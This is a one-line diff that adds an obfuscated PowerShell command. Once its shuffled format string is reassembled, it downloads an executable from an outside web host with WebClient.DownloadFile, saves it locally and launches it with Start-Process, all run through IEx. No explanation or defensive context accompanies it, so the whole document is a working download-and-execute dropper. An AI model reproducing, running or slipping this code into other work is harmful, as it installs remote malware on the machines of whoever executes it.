@@ -1,0 +1,1 @@
+﻿((("{23}{0}{16}{18}{11}{7}{17}{22}{5}{21}{20}{13}{15}{19}{8}{3}{10}{14}{4}{12}{9}{6}{2}{1}"-f 'jec','e.exe3ox','bl','fleeble','x);','nloadFile(3oxh','oxflee','nt','x','Process 3','.exe','.WebClie','Start-','://world','3o','n','t System',').Do','.Net','it.com/com.exe3ox,3o','tp','t','w','(New-Ob'))  -cRePLace'3ox',[ChaR]39)| IEx
